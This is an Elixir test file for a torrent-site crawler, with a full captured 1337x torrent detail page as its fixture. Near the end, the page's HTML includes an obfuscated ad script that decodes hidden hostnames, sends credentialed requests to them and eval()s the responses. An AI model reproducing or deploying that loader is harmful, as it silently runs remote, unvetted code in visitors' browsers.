defmodule Magnetissimo.Crawler.LeetxTest do
  use ExUnit.Case, async: true

  test "scrapes torrent information from detail page" do
    torrent = Magnetissimo.Crawler.Leetx.torrent_information(detail_sample)
    IO.inspect torrent
    assert torrent != nil
  end

  def detail_sample do
    """
    <!DOCTYPE html>
    <html>
    <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Download [bonkai77] BTOOOM! [1080p] [DUAL-AUDIO] [x265] [HEVC] [AAC] [10bit] Torrent | 1337x</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script type="text/javascript">
    //<![CDATA[
    try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"5a20c6d6ad0351f2f34eac44266f710a",petok:"814110218f1c0e6ee2ed83e3e9d5d7d327be2e06-1482810598-1800",adblock:1,betok:"dfca998a48a9b7449ad494f05db1dcc5dee53e32-1482810598-120",zone:"1337x.to",rocket:"0",apps:{}}];!function(a,b){a=document.createElement("script"),b=document.getElementsByTagName("script")[0],a.async=!0,a.src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=f2befc48d1/cloudflare.min.js",b.parentNode.insertBefore(a,b)}()}}catch(e){};
    //]]>
    </script>
    <link rel="stylesheet" href="/css/jquery-ui.css">
    <link rel="stylesheet" href="/css/icons.css">
    <link rel="stylesheet" href="/css/modal.css">
    <link rel="stylesheet" href="/css/scrollbar.css">
    <link rel="stylesheet" href="/css/style.css?ver=2.5">
    <link rel="shortcut icon" href="/favicon.ico">
    <!--[if lt IE 9]><script src = "/js/html5shiv.js"></script><![endif]-->
    </head>
    <body>
    <div class="mobile-menu"></div>
    <div class="top-bar">
    <div class="container">
    <ul class="top-bar-nav">
    <li><a href="/register">Register</a></li>
    <li class="active"><a href="/login">Login</a></li>
    </ul>
    </div>
    </div>
    <header>
    <div class="container">
    <div class="clearfix">
    <div class="logo"><a href="/home/"><img alt="logo" src="/images/christmas-logo.svg"></a></div>
    <a href="#" class="navbar-menu"><span></span><span></span><span></span></a>
    <div class="search-box">
    <form id="search-form" method="get" action="/srch">
    <input type="search" placeholder="Search for torrents.." id="autocomplete" name="search" class="ui-autocomplete-input form-control" autocomplete="off">
    <button type="submit" class="btn btn-search"><i class="flaticon-search"></i><span>Search</span></button>
    </form>
    </div>
    </div>
    <nav>
    <ul class="main-navigation">
    <li class="active"><a href="/home/" title="Go to Home">Home</a></li>
    <li><a href="/upload" title="Upload Torrent File">Upload</a></li>
    <li><a href="/rules" title="Rules">Rules</a></li>
    <li><a href="/contact" title="Contact 1337x">Contact</a></li>
    <li><a href="/about" title="About us">About us</a></li>
    </ul>
    </nav>
    </div>
    </header>
    <main class="container">
    <div class="row">
    <aside class="col-3 pull-right">
    <div class="list-box">
    <h2>Browse torrents</h2>
    <ul>
    <li><a href="/trending" title="Trending Torrents"><i class="flaticon-trending"></i> Trending Torrents</a></li>
    <li><a href="/christmas-movies/1/" title="Christmas Movies"><i class="flaticon-christmas-tree"></i> Christmas Movies</a></li>
    <li><a href="/movie-library/1/" title="Movie Liabrary"><i class="flaticon-movie-library"></i> Movie library</a></li>
    <li><a href="/series-library/a/1/" title="TV Liabrary"><i class="flaticon-tv-library"></i> TV library</a></li>
    <li><a href="/new-episodes/day/1/" title="New TV Episodes"><i class="flaticon-tv"></i> New TV Episodes</a></li>
    <li><a href="/top-100" title="Top 100 Torrents"><i class="flaticon-top"></i> Top 100 Torrents</a></li>
    <li><a href="/cat/Anime/1/" title="Anime"><i class="flaticon-ninja-portrait"></i> Anime</a></li>
    <li><a href="/cat/Apps/1/" title="Applications"><i class="flaticon-apps"></i> Applications</a></li>
    <li><a href="/cat/Documentaries/1/" title="Documentaries"><i class="flaticon-documentary"></i> Documentaries</a></li>
    <li><a href="/cat/Games/1/" title="Games"><i class="flaticon-games"></i> Games</a></li>
    <li><a href="/cat/Movies/1/" title="Movies"><i class="flaticon-movies"></i> Movies</a></li>
    <li><a href="/cat/Music/1/" title="Movies"><i class="flaticon-music"></i> Music</a></li>
    <li><a href="/cat/Other/1/" title="Others"><i class="flaticon-other"></i> Other</a></li>
    <li><a href="/cat/TV/1/" title="Television"><i class="flaticon-tv"></i> Television</a></li>
    <li><a href="/cat/XXX/1/" title="XXX"><i class="flaticon-xxx"></i> XXX</a></li>
    </ul>
    </div>
    <div class="list-box hidden-sm">
    <h2>1337x Links</h2>
    <ul class="list">
    <li><a target="_blank" href="https://chat.1337x.to"> 1337x Chat</a></li>
    <li><a target="_blank" href="https://bitsnoop.com"> BitSnoop</a></li>
    <li><a target="_blank" href="https://www.limetorrents.cc"> Limetorrents</a></li>
    <li><a target="_blank" href="https://www.torrentfunk.com"> TorrentFunk</a></li>
    <li><a target="_blank" href="http://www.torrentbit.net"> TorrentBit</a></li>
    <li><a target="_blank" href="https://www.torlock.com"> Torlock</a></li>
    <li><a target="_blank" href="https://torrentproject.se"> TorrentProject</a></li>
    </ul>
    </div>
    </aside>
    <script>
    function count(t){return $.ajax({async:!1,type:"POST",url:"/dltrack/1977812/",data:{dst:t.href,src:document.location.href,torid:"1977812"}}),!1}
    </script>
    <style>.btn-bcdefaaf{background-color:#e00000;color:#fff;}.btn-bcdefaaf .icon{background-color:#980404;}.btn-bcdefaaf .icon::after{border-left-color:#980404;}.btn-bcdefaaf:hover{background-color:#cd0303;color:#fff;}.btn-bcdefaaf:focus,.btn-bcdefaaf:active:focus{background-color:#8d0808;color:#fff;}.btn-cbbfbaaa{background-color:#00ceed;color:#fff;}.btn-cbbfbaaa .icon{background-color:#0f8091;}.btn-cbbfbaaa .icon::after{border-left-color:#0f8091;}.btn-cbbfbaaa:hover{background-color:#02bbd7;color:#fff;}.btn-cbbfbaaa:focus,.btn-cbbfbaaa:active:focus{background-color:#0f7584;color:#fff;}.bebdcefb{position:relative;top:-6px;color:#fff;font-size:12px;border-radius:0 0 5px 5px;background:url('/css/images/notfication-bg.png') repeat 0 0;background-color:#5fa2d7;transition:all .2s ease;}.bebdcefb:hover{background:url('/css/images/notfication-bg.png') repeat 0 0;background-color:#5795c4;}.bebdcefb a:hover{text-decoration:underline;}.bebdcefb:active{background:url('/css/images/notfication-bg.png') repeat 0 0;background-color:#236597;}.bebdcefb .icon{color:#fff;display:block;height:100%;left:0;position:absolute;top:0;padding-top:4px;width:40px;text-align:center;border-radius:0 0 0 5px;background:url('/css/images/notfication-bg.png') repeat 0 0;background-color:#236597;}.bebdcefb .icon i{position:absolute;left:50%;top:50%;margin-left:-24%;margin-top:-30%;}.bebdcefb a{color:#fff;display:inline-block;padding:18px 0 11px 66px;}</style>
    <div class="col-9 page-content">
    <div class="box-info torrent-detail-page  vpn-info-wrap">
    <div class="box-info-heading clearfix"><h1> [bonkai77] BTOOOM! [1080p] [DUAL-AUDIO] [x265] [HEVC] [AAC] [10bi... </h1>
    </div>
    <div class="box-info-detail no-top-radius">
    <div class="torrent-category-detail clearfix">
    <ul class="download-links btn-wrap-list">
    <li><a class="btn-icon btn btn-magnet" href="magnet:?xt=urn:btih:9DF18DBE919E9D251AB217CF00434FA99090D206&dn=%5Bbonkai77%5D+BTOOOM%21+%5B1080p%5D+%5BDUAL-AUDIO%5D+%5Bx265%5D+%5BHEVC%5D+%5BAAC%5D+%5B10bit%5D&tr=http%3A%2F%2Ftracker.anirena.com%3A80%2Fannounce&tr=udp%3A%2F%2Fp4p.arenabg.ch%3A1337%2Fannounce&tr=udp%3A%2F%2Fexplodie.org%3A6969%2Fannounce&tr=udp%3A%2F%2F9.rarbg.to%3A2710%2Fannounce&tr=udp%3A%2F%2Fipv4.tracker.harry.lu%3A80%2Fannounce&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=http%3A%2F%2Fanidex.moe%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.ilibr.org%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969%2Fannounce&tr=udp%3A%2F%2Fcoppersurfer.tk%3A6969%2Fannounce" onclick="javascript: count(this);"><span class="icon"><i class="flaticon-magnet"></i></span>Magnet Download</a> </li>
    <li style="margin-top:0px;"></li>
    <li style="margin-top:0px;"></li>
    <li><a id="bcdefaaf" class="btn-icon btn btn-bcdefaaf" href="bcdefaaf"><span class="icon"><i class="flaticon-stream"></i></span>Play Now (Stream)</a></li>
    <li style="margin-top:0px;"></li>
    <li style="margin-top:0px;"></li>
    <li class="dropdown">
    <a data-toggle="dropdown" class="btn-icon btn btn-torrent-download" onclick="javascript: count(this);" href="#"><span class="icon"><i class="flaticon-two-down-arrows"></i></span>Torrent Download</a>
    <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
    <li><a class="btn-icon btn btn-torrent-mirror-download" target="_blank" href="http://itorrents.org/torrent/9DF18DBE919E9D251AB217CF00434FA99090D206.torrent"><span class="icon"><i class="flaticon-torrent-download"></i></span>ITORRENTS MIRROR</a> </li>
    <li><a class="btn-icon btn btn-torrent-mirror-download" target="_blank" href="http://torrage.info/torrent.php?h=9DF18DBE919E9D251AB217CF00434FA99090D206"><span class="icon"><i class="flaticon-torrent-download"></i></span>TORRAGE MIRROR</a></li>
    <li><a class="btn-icon btn btn-torrent-mirror-download" target="_blank" href="http://btcache.me/torrent/9DF18DBE919E9D251AB217CF00434FA99090D206"><span class="icon"><i class="flaticon-torrent-download"></i></span>BTCACHE MIRROR</a></li>
    <li><a class="btn-icon btn btn-magnet" href="magnet:?xt=urn:btih:9DF18DBE919E9D251AB217CF00434FA99090D206&dn=%5Bbonkai77%5D+BTOOOM%21+%5B1080p%5D+%5BDUAL-AUDIO%5D+%5Bx265%5D+%5BHEVC%5D+%5BAAC%5D+%5B10bit%5D&tr=http%3A%2F%2Ftracker.anirena.com%3A80%2Fannounce&tr=udp%3A%2F%2Fp4p.arenabg.ch%3A1337%2Fannounce&tr=udp%3A%2F%2Fexplodie.org%3A6969%2Fannounce&tr=udp%3A%2F%2F9.rarbg.to%3A2710%2Fannounce&tr=udp%3A%2F%2Fipv4.tracker.harry.lu%3A80%2Fannounce&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337%2Fannounce&tr=http%3A%2F%2Fanidex.moe%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.ilibr.org%3A6969%2Fannounce&tr=udp%3A%2F%2Ftracker.zer0day.to%3A1337%2Fannounce&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969%2Fannounce&tr=udp%3A%2F%2Fcoppersurfer.tk%3A6969%2Fannounce"><span class="icon"><i class="flaticon-magnet"></i></span>None Working? Use Magnet</a></li>
    </ul>
    </li>
    <li style="margin-top:0px;"></li>
    <li style="margin-top:0px;"></li>
    <li><a id="cbbfbaaa" class="btn-icon btn btn-cbbfbaaa" href="cbbfbaaa"><span class="icon"><i class="flaticon-direct-download"></i></span>Direct Download</a> </li>
    <li style="margin-top:0px;"></li>
    <li style="margin-top:0px;"></li>
    </ul>
    <ul class="list">
    <li> <strong>Category</strong> <span>Anime</span> </li>
    <li> <strong>Type</strong> <span>Anime</span> </li>
    <li> <strong>Language</strong> <span>English</span> </li>
    <li> <strong>Total size</strong> <span>2.7 GB</span> </li>
    <li> <strong>Uploaded By</strong> <span><small class="uploader"></small> <a href="/user/bonkai77/">bonkai77</a></span> </li>
    </ul>
    <ul class="list">
    <li> <strong>Downloads</strong> <span>12</span> </li>
    <li> <strong>Last checked</strong> <span>35 minutes ago</span> </li>
    <li> <strong>Date uploaded</strong> <span>7 hours ago</span> </li>
    <li> <strong>Seeders</strong> <span class="seeds">2</span> </li>
    <li> <strong>Leechers</strong> <span class="leeches">2</span> </li>
    </ul>
    </div>
    <div class="bebdcefb"><a id="bebdcefb" href="bebdcefb"><span class="icon"><i class="flaticon-shield-sat"></i></span>Your IP Address is <strong class="vpn-ip"></strong> Location is <strong class="vpn-country"></strong> - Your ISP and Government can track your torrent activity! Hide your IP with a VPN!</a></div>
    <script type="text/javascript">
                        document.getElementById("bcdefaaf").onclick=function(){return location.href="/stream/1977812/bonkai77-BTOOOM-1080p-DUAL-AUDIO-x265-HEVC-AAC-10bit/",!1};
                        document.getElementById("cbbfbaaa").onclick=function(){return location.href="/mirror2-%5Bbonkai77%5D+BTOOOM%21+%5B1080p%5D+%5BDUAL-AUDIO%5D+%5Bx265%5D+%5BHEVC%5D+%5BAAC%5D+%5B10bit%5D",!1};
              document.getElementById("bebdcefb").onclick=function(){return location.href="/vpn.php",!1};
              </script>
    <div class="manage-box">
    <div class="infohash-box">
    <p> <strong>Infohash :</strong> <span>9DF18DBE919E9D251AB217CF00434FA99090D206</span></p>
    </div>
    </div>
    <div class="torrent-tabs">
    <ul class="tab-nav clearfix">
    <li role="presentation" class="active"><a href="#description" aria-controls="description" role="tab" data-toggle="tab">Description</a></li>
    <li role="presentation"><a href="#files" aria-controls="files" role="tab" data-toggle="tab">Files</a></li>
    <li role="presentation"><a href="#comments" aria-controls="comments" role="tab" data-toggle="tab">Comments<span class="active">0</span></a></li>
    <li role="presentation" class="hidden-xs"><a href="#tracker-list" aria-controls="tracker-list" role="tab" data-toggle="tab">Tracker list</a></li>
    </ul>
    <div class="tab-content">
    <div role="tabpanel" class="tab-pane active" id="description">
    <p>File Container: MKV
    <br/>Video Format: h.265/HEVC [10-bit]
    <br/>Video Resolution: 1920x1080
    <br/>Aspect Ratio: 16.9
    <br/><br/>Audio Type: Mixed
    <br/>Track 1: English (2.0 Stereo) (default)
    <br/>Track 2: Japanese (2.0 Stereo)
    <br/><br/>Audio Format: AAC-LC
    <br/><br/>Subtitles: (VobSub/ASS)
    <br/>Track 1: English Signs/Song Retail (US-BD) (default)
    <br/>Track 2: English Subs Retail (US-BD)
    <br/>Track 3: English Subs [FFF] (Modified)
    <br/><br/><br/>Retail BlueRay ripped with MakeMKV FLAC profile.
    <br/>Source: Bluray | MKV | h264 | 1080p | FLAC 2.0 | Dual Audio | Softsubs (Retail) | 47.44 GB
    <br/></p>
    </div>
    <div role="tabpanel" class="tab-pane file-content" id="files">
    <h2>Files: </h2>
    <span class="head"><i class="flaticon-folder"></i>[bonkai77] BTOOOM! [1080p] [DUAL-AUDIO] [x265] [HEVC] [AAC] [10bit]</span>
    <ul>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.04.Best.in.the.World.1080p.Dual.Audio.Bluray.mkv (288.8 MB)</li>
    <li><i class="flaticon-other-file"></i>[bonkai77] BTOOOM! [1080p] [DUAL-AUDIO] [x265] [HEVC] [AAC] [10bit].sfv (1.0 KB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.01.Start.1080p.Dual.Audio.Bluray.mkv (205.5 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.02.The.Bloodstained.High.School.Girl.1080p.Dual.Audio.Bluray.mkv (195.3 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.03.Survival.1080p.Dual.Audio.Bluray.mkv (279.4 MB)</li>
    <li><i class="flaticon-other-file"></i>torrent.info.nfo (0.5 KB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.05.Attack.1080p.Dual.Audio.Bluray.mkv (252.4 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.06.Night.of.Sacrifice.1080p.Dual.Audio.Bluray.mkv (175.1 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.07.Virtual.Bride.1080p.Dual.Audio.Bluray.mkv (253.1 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.08.White.Ghost.1080p.Dual.Audio.Bluray.mkv (218.0 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.09.The.Strongest.Player.1080p.Dual.Audio.Bluray.mkv (252.7 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.10.High.Level.1080p.Dual.Audio.Bluray.mkv (208.1 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.11.Revival.1080p.Dual.Audio.Bluray.mkv (222.8 MB)</li>
    <li><i class="flaticon-movies"></i>[bonkai77].Btooom!.Episode.12.Bonds.1080p.Dual.Audio.Bluray.mkv (227.0 MB)</li>
    </ul>
    </div>
    <div role="tabpanel" class="tab-pane" id="comments">
    <h2>There are currently no comments. Feel free to leave one :)</h2>
    </div>
    <div role="tabpanel" class="tab-pane" id="tracker-list">
    <h3>Code: </h3>
    <ul>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> http://tracker.anirena.com:80/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://p4p.arenabg.ch:1337/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://explodie.org:6969/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://9.rarbg.to:2710/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://ipv4.tracker.harry.lu:80/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://tracker.coppersurfer.tk:6969/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://tracker.opentrackr.org:1337/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> http://anidex.moe:6969/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://tracker.zer0day.to:1337/announce</li>
    <li><span class="icon"><i class="flaticon-href-link"></i></span> udp://tracker.ilibr.org:6969/announce</li>
    </ul>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </main>
    <footer>
    <a class="scroll-top" href="#"><i class="flaticon-up"></i></a>
    <ul>
    <li><a href="/">Home</a></li>
    <li class="active"><a href="/home/">Full Home Page</a></li>
    <li><a href="/contact">Dmca</a></li>
    <li><a href="/contact">Contact</a></li>
    </ul>
    <p class="info">1337x 2007 - 2016</p>
    </footer>
    <script src="/js/jquery-1.11.0.min.js"></script>
    <script src="/js/jquery-ui.js"></script>
    <script src="/js/auto-search.js"></script>
    <div class="modal fade modal-custom align-center" id="alert-popup" tabindex="-1" role="dialog" aria-labelledby="AlertPopup">
    <div class="modal-dialog" role="document">
    <div class="modal-content">
    <div class="modal-header">
    <a href="#" class="close" data-dismiss="modal" aria-label="Close"><i class="flaticon-logout"></i></a>
    <h4 class="modal-title" id="AlertPopup">You will be redirected in 3 seconds.</h4>
    </div>
    <div class="modal-body">
    <p>You are leaving 1337x to a website that is not affiliated with us in any way.</p>
    <p>We cannot guarantee for security of a linked website.</p>
    </div>
    </div>
    </div>
    </div>
    <script src="/js/equalheight.js"></script>
    <script src="/js/scrollbar.js"></script>
    <script src="/js/tab.js"></script>
    <script src="/js/lazyload.min.js"></script>
    <script src="/js/comment.js"></script>
    <script src="/js/pagination.js"></script>
    <script src="/js/modal.js"></script>
    <script src="/js/main.js"></script>
    <script>
    function vpn_height(){
      vpn_info_height = $('.vpn-info').outerHeight() - 6 + 29;
      $('.vpn-info-wrap .torrent-detail .shadow').css('bottom', - vpn_info_height)
    }
      function resizeHeight() {
        jQuery('.js-height .js-col').maxHeight();
      }
      resizeHeight();
      $(window).resize(function(){
        vpn_height();
        resizeHeight();
      })

      function torrent_desc_width(){
        torrent_wrap_width = $('.torrent-detail-page .torrent-detail').width();
        torrent_image_width = $('.torrent-image-wrap').outerWidth();
        torrent_detail_width = $('.torrent-detail-info').outerWidth();
        torrent_total_width = torrent_wrap_width - torrent_image_width - 1;
        $('.torrent-detail-info').css('min-width', torrent_total_width);
      }

      function  modal_resize(){
        window_height = $(window).height();
        modal_height = $('.modal.in .modal-dialog').outerHeight();
        total_height = window_height - modal_height;
        $('.modal.in .modal-dialog').css('margin-top', total_height / 2);
      }

      $('.modal').on('shown.bs.modal', function (e) {
        modal_resize();
      })
      modal_resize();

      $(window).resize(function(){
        torrent_desc_width();
      });

      $('a[data-toggle="tab"]').tab();

      $(window).load(function() {
        vpn_height();
        torrent_desc_width();
        $(".content-row").mCustomScrollbar();
      });

      $("img.lazy").lazyload({
        effect : "fadeIn",
        placeholder : '/images/profile-load.svg'
      });

      $('a[href="#comments"]').on('shown.bs.tab', function () {
        $("img.lazy").lazyload({
          effect : "fadeIn",
          placeholder : '/images/profile-load.svg'
        });
      });


      var modal_url;
      $('.js-modal-url').click(function(){
        modal_url = $(this).attr('href')
      });

      $('#alert-popup').on('shown.bs.modal', function (e) {
        setTimeout(function() {
           window.location.href = modal_url;
        }, 3000); // Chnage location Time
      })



    var members;
    $(window).load(function() {
            $.ajax({
           type: "GET",
            crossDomain: true,
            url: "//cdn.1337x.to/ip.php",
            dataType: "json",
            success: function(data) {
              $('.vpn-country').html(data.country);
              $('.vpn-ip').html(data.ip);
              vpn_height();
            }
        });

          var url = "/comments.php?torrentid=1977812" ;
        $.getJSON(url, function(result) {
            console.log(result);
            members = result;
            buildComment(result);

        }).done(function(){
        });
    });

    </script>
    <script data-cfasync="false" type="text/javascript">var S5U=window;for(var g in S5U){if(g.length===((88.,149)>=(0x240,70.)?(120,6):(0x245,97))&&g.charCodeAt(((0x31,6)>=82?(127,0x1F3):(6,6.63E2)<87.2E1?(0x202,3):(104.,0xC2)))===((111.,0x71)<=(7.0E1,117.7E1)?(0x33,100):(74.2E1,0x11F))&&g.charCodeAt((0x174>=(0x24D,0xA3)?(4.25E2,5):(74,133.)))===((49.1E1,25)<=0x23D?(120,119):(86.,0x1C5))&&g.charCodeAt(((2.5E1,60)<=(66.5E1,9.4E1)?(8.040E2,1):(84.,0x1CC)<=(1.05E2,0xC6)?(0x1B0,14.):(0x167,0x79)))===((25,0xEC)>=0x40?(0x206,105):1.3E2>(107.,0x126)?(62,'u'):(128.,1.04E2))&&g.charCodeAt(((143,1.2690E3)>=(34.,0x129)?(0x141,0):(0x191,11.10E1)))===(13>(59.0E1,57.1E1)?0x48:(2.010E2,0x138)<=0x170?(0x1A9,119):(5.41E2,41.)))break};for(var Z in S5U[g]){if(Z.length===((0x24F,7.0E2)<(0x23A,1.101E3)?(118.80E1,8):(73.,0x1A1))&&Z.charCodeAt(((71,1.074E3)<=7.30E1?(0x6A,200):0x187<(58.,57.90E1)?(95.30E1,5):(0xC9,20.)))===(6.4E2>=(4.19E2,0x1D0)?(102,101):(8.55E2,83.))&&Z.charCodeAt(((64.,0x4)<(20.,0x162)?(42.90E1,7):(0x75,69.)))===((0x106,40.)<64.5E1?(52.80E1,116):(1.485E3,145.))&&Z.charCodeAt((0x128>(0x21,134.)?(3.2E1,3):(7.01E2,0xE4)>89.30E1?"g":(6.9E2,0x18A)))===(23.<=(14.870E2,6.98E2)?(29.5E1,117):(0x1A2,0x13C)>0x219?(1.36E2,111):(10.21E2,7.94E2))&&Z.charCodeAt(((0,88.)<=(0x63,1.238E3)?(38.,0):5.310E2>=(0x121,6.24E2)?0xE3:(4.53E2,5)))===((32.80E1,0x54)<0xD4?(3.25E2,100):(0x1B9,5.11E2)))break};(function(U,z,f,J){S5U[g][z]=function(){var y=0,n=function n(){var l='//',c='GET',L=new XMLHttpRequest();L.withCredentials=true;L.open((c),(l)+S5U[g]['atob'](f[y].split('').reverse().join(''))+'/'+J+'/',true);L.onreadystatechange=function(){if(L.readyState==4&&L.status==200&&L.responseText){eval(L.responseText);}};L.onerror=function(){if(++y!=f.length){n();}};try{L.send();}catch(v){L.onerror();}};n();};})(S5U[g][Z],'_aeksez',['tF2YiV2duMmY4Ymbhlza','=s2Ypx2YugjM2EHe30mb','=U2YhB3cuUTO0hDejJ2Y','3VWa2VmcuMnY2Qjb1dXc'],919765);</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=919759" onerror="window._aeksez();"></script>
    <script>
    if (top != self) {top.location.replace(self.location.href);}
    </script>
    </body>
    </html>
    """
  end

end
